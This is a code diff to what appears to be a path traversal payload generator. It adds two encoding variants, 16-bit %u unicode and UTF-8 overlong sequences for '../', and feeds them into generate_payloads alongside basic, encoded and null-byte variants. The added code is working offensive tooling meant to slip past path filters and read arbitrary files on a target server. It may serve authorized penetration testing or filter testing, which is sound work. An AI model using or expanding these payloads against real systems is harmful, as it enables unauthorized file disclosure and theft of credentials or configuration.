@@ -34,6 +34,16 @@ def _encoded(rel, depth):
     return out
 
 
+def _unicode16(rel, depth):
+    """16-bit unicode: . = %u002e, / = %u2215 (IIS/.NET-style decoders)."""
+    return [("%u002e%u002e%u2215" * n) + rel for n in range(1, depth + 1)]
+
+
+def _overlong(rel, depth):
+    """UTF-8 overlong: . = %c0%ae, / = %c0%af (lax UTF-8 decoders)."""
+    return [("%c0%ae%c0%ae%c0%af" * n) + rel for n in range(1, depth + 1)]
+
+
 def _leading_path(rel, depth):
     out = []
     for base in COMMON_BASES:
@@ -87,6 +97,8 @@ def generate_payloads(target_file: str, depth: int = 8, os_filter: str = "both",
     out += _basic(rel, depth)
     out += _nonrecursive(rel, depth)
     out += _encoded(rel, depth)
+    out += _unicode16(rel, depth)
+    out += _overlong(rel, depth)
     out += _leading_path(rel, depth)
     out += _null_byte(rel, depth, null_exts)
     out += _extended(rel, depth)
